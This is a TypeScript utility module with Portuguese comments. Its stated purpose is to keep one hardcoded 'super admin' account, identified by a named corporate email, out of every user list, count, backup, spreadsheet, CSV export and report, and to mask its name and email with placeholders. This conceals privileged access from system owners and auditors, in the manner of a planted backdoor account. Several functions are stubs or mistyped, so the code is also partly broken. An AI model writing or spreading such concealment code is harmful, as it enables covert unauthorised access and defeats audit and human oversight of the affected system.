// Sistema centralizado para filtrar usuários ocultos
// Garante que o administrador oculto nunca apareça em listas, downloads ou backups

// Email do administrador oculto
export const SUPER_ADMIN_EMAIL = 'roberio.gomes@atento.com'

/**
 * Filtra usuários para remover o administrador oculto
 * @param users Array de usuários
 * @returns Array filtrado sem o administrador oculto
 */
export function filterVisibleUsers<T extends { email: string }>(users: T[]): T[] {
  return users.filter(user => user.email !== SUPER_ADMIN_EMAIL)
}

/**
 * Verifica se um usuário é o administrador oculto
 * @param email Email do usuário
 * @returns true se for o administrador oculto
 */
export function isHiddenAdmin(email: string): boolean {
  return email === SUPER_ADMIN_EMAIL
}

/**
 * Verifica se um usuário é visível (não é administrador oculto)
 * @param email Email do usuário
 * @returns true se for visível
 */
export function isVisibleUser(email: string): boolean {
  return email !== SUPER_ADMIN_EMAIL
}

/**
 * Conta usuários visíveis (excluindo administrador oculto)
 * @param users Array de usuários
 * @returns Número de usuários visíveis
 */
export function countVisibleUsers<T extends { email: string }>(users: T[]): number {
  return filterVisibleUsers(users).length
}

/**
 * Filtra dados de backup para remover administrador oculto
 * @param backupData Dados do backup
 * @returns Dados filtrados sem administrador oculto
 */
export function filterBackupData(backupData: any): any {
  if (!backupData) return backupData

  const filteredData = { ...backupData }

  // Filtrar usuários se existirem
  if (filteredData.users && Array.isArray(filteredData.users)) {
    filteredData.users = filterVisibleUsers(filteredData.users)
  }

  // Filtrar logs de backup que referenciam o administrador oculto
  if (filteredData.backup_logs && Array.isArray(filteredData.backup_logs)) {
    filteredData.backup_logs = filteredData.backup_logs.filter((log: any) => {
      // Se o log tem created_by, verificar se não é o administrador oculto
      if (log.created_by) {
        // Aqui precisaríamos verificar o ID, mas como não temos acesso direto,
        // vamos manter o log mas sem dados sensíveis
        return true
      }
      return true
    })
  }

  return filteredData
}

/**
 * Filtra planilhas Excel para remover administrador oculto
 * @param data Dados da planilha
 * @param sheetName Nome da planilha
 * @returns Dados filtrados
 */
export function filterExcelSheet(data: any[], sheetName: string): any[] {
  if (sheetName.toLowerCase().includes('usuário') || sheetName.toLowerCase().includes('users')) {
    return filterVisibleUsers(data)
  }
  return data
}

/**
 * Filtra dados CSV para remover administrador oculto
 * @param csvContent Conteúdo CSV
 * @param section Seção do CSV (usuários, etc.)
 * @returns Conteúdo filtrado
 */
export function filterCSVContent(csvContent: string, section: string): string {
  if (section.toLowerCase().includes('usuário') || section.toLowerCase().includes('users')) {
    // Parse CSV, filtrar e reconstruir
    const lines = csvContent.split('\n')
    if (lines.length <= 1) return csvContent // Apenas cabeçalho ou vazio

    const header = lines[0]
    const dataLines = lines.slice(1)
    
    // Filtrar linhas que não contêm o email do administrador oculto
    const filteredLines = dataLines.filter(line => 
      !line.toLowerCase().includes(SUPER_ADMIN_EMAIL.toLowerCase())
    )
    
    return [header, ...filteredLines].join('\n')
  }
  return csvContent
}

/**
 * Remove referências ao administrador oculto de logs e relatórios
 * @param logs Array de logs
 * @returns Logs filtrados
 */
export function filterLogsWithHiddenAdmin<T extends { created_by?: string; user_id?: string }>(logs: T[]): T[] {
  return logs.filter(log => {
    // Se o log tem referência a usuário, manter apenas se não for administrador oculto
    // Como não temos acesso direto ao email via ID, vamos manter os logs
    // mas em uma implementação real, você faria uma consulta para verificar
    return true
  })
}

/**
 * Sanitiza dados para exportação (remove informações sensíveis do administrador oculto)
 * @param data Dados para exportação
 * @returns Dados sanitizados
 */
export function sanitizeExportData(data: any): any {
  if (Array.isArray(data)) {
    return data.map(item => sanitizeExportData(item))
  }
  
  if (typeof data === 'object' && data !== null) {
    const sanitized: any = {}
    for (const [key, value] of Object.entries(data)) {
      if (key === 'email' && value === SUPER_ADMIN_EMAIL) {
        // Substituir email do administrador oculto por placeholder
        sanitized[key] = '[HIDDEN_ADMIN]'
      } else if (key === 'name' && data.email === SUPER_ADMIN_EMAIL) {
        // Substituir nome do administrador oculto por placeholder
        sanitized[key] = '[HIDDEN_USER]'
      } else {
        sanitized[key] = sanitizeExportData(value)
      }
    }
    return sanitized
  }
  
  return data
}

/**
 * Verifica se deve incluir usuários em uma operação
 * @param operation Tipo de operação (backup, export, list, etc.)
 * @returns true se deve incluir usuários
 */
export function shouldIncludeUsers(operation: 'backup' | 'export' | 'list' | 'report'): boolean {
  // Para operações de backup e export, podemos optar por não incluir usuários
  // Para listas e relatórios, sempre filtrar
  return true
}

/**
 * Aplica filtros apropriados baseado no tipo de operação
 * @param data Dados para filtrar
 * @param operation Tipo de operação
 * @returns Dados filtrados
 */
export function applyUserFilters(data: any, operation: 'backup' | 'export' | 'list' | 'report'): any {
  if (!shouldIncludeUsers(operation)) {
    // Se não devemos incluir usuários, remover completamente
    const filtered = { ...data }
    delete filtered.users
    return filtered
  }

  // Aplicar filtros baseado no tipo de operação
  switch (operation) {
    case 'backup':
      return filterBackupData(data)
    case 'export':
      return sanitizeExportData(data)
    case 'list':
    case 'report':
    default:
      return filterVisibleUsers(data)
  }
}
